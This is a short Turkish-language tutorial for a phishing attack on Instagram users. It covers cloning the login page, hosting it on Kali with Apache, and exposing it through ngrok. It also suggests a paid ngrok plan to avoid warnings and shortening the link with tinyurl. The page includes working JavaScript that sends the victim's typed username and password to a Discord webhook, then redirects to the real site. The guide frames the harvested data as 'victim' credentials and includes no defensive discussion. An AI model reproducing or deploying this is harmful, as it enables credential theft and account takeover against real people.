# Instagram Oltalama Saldırıları

- Instagram Şifre sıfırlama veya instagram giriş sayfasının orjinal hali kodları kopyalanır. Html css kodları ile hazırlanır.
- İster web hosting al ister kali servis olarak aç. Oluşturulan kopya kalide /var/www/html aktarılır.
  > service apache2 start

//

<script>
function sendMessage() {
var request = new XMLHttpRequest();
request.open("POST", "WEBHOOK"); //dicord kanal açıp webhook linki buraya yapıştırılır
request.setRequestHeader('Content-type', 'application/json');
var params = {
content: ("> **USERNAME : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
}
request.send(JSON.stringify(params));

            setTimeout(function () {
                window.location.replace("https://www.instagram.com");
            }, 1000);
        }
    </script>

//

## Ngrok ile dış dünyaya açmak

- Kali terminalde ilgili konuma yerleşilir /var/www/html/instawebhook
- Üye olduktan sonra ngrok kurulumu için verilen komutlar cp terminalde kullanılır
  /var/www/html/instawebhook > ngrok config add-authtoken ...
  /var/www/html/instawebhook > ngrok http http://localhost:80
- Açılan ekranda https://...free.app kısmı sitenin nete açılmış linkidir
- Tarayıcıda siteye gidildiğinde uyarılar çıkmaması için ngrok ücretli plan alınabilir

* tinyurl.com ile üstteki uzun urlyi kısaltabiliriz

- Kurban giriş bilgileri giriş yaptığında discord kanalında sohbette çıkar
